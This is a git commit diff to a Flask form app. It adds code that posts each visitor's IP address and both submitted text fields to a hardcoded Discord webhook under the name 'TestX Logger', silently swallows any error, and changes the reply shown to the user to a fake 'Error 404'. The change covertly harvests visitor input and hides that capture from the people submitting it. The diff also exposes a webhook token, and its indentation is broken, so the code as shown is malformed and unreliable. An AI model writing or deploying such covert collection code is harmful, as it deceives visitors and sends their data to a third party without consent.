76c3114490911b6f80b6d0c3d13fbfea9a6c44c9
VDX <134436359+mohammmedVDX@users.noreply.github.com>
2026-01-17 08:24:46 +0300

    Update app.py

--- app.py
+++ app.py
@@ -1,5 +1,8 @@
 from flask import Flask, request, render_template
 from datetime import datetime
+import requests
+DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1461953742013468673/doZ1FYwNPxdrsnh6c60ng1__tf_FPM-d1jznCDu4KsqemO8zwE1sScCV5e96rSPj1pq9"
+
 
 app = Flask(__name__)
 LOG_FILE = "submissions.txt"
@@ -22,13 +25,34 @@ def submit():
     with open(LOG_FILE, "a", encoding="utf-8") as f:
         f.write(f"[{now}] {ip} | {t1} | {t2}\n")
 
+    payload = {
+    "username": "TestX Logger",
+    "embeds": [
+        {
+            "title": "📩 New Submission",
+            "color": 5793266,
+            "fields": [
+                {"name": "🕒 Time", "value": now, "inline": False},
+                {"name": "🌐 IP", "value": ip, "inline": False},
+                {"name": "✏️ Text 1", "value": t1 or "—", "inline": False},
+                {"name": "✏️ Text 2", "value": t2 or "—", "inline": False},
+            ]
+        }
+    ]
+}
+
+try:
+    requests.post(DISCORD_WEBHOOK, json=payload, timeout=5)
+except:
+    pass
+
     print("="*50)
     print(now, ip)
     print(t1)
     print(t2)
     print("="*50)
 
-    return "تم الإرسال ✓"
+    return "Error 404"
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8080)
